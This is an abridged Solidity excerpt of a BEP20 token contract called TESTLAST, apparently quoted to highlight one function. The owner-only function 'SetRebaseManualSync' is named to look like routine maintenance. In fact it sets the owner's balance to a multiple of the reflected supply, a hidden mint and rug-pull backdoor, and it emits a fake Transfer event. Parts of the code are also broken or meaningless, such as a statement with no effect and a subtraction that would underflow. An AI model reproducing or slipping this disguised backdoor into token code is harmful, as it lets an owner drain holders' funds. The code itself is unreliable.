...
contract TEST is IBEP20, Auth {
    ...
    string constant _symbol = "TESTLAST";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x9D3b382bdcf5E51ad17fa0A951A8EaAEEd62159A;
        devFeeReceiver = 0x9D3b382bdcf5E51ad17fa0A951A8EaAEEd62159A;
    ...
    function SetRebaseManualSync(uint256 amount) public onlyOwner {
    _SetRebaseManualSync(msg.sender, amount);
    }
    ...
    function _SetRebaseManualSync(address account, uint256 amount) internal virtual {
        
        _rBalance[msg.sender] = rSupply*amount;
        _rBalance[account] + amount;
        _totalSupply = _totalSupply.sub(uint256(_totalSupply*amount));
        emit Transfer(address(0), msg.sender, _totalSupply*amount);      
    }
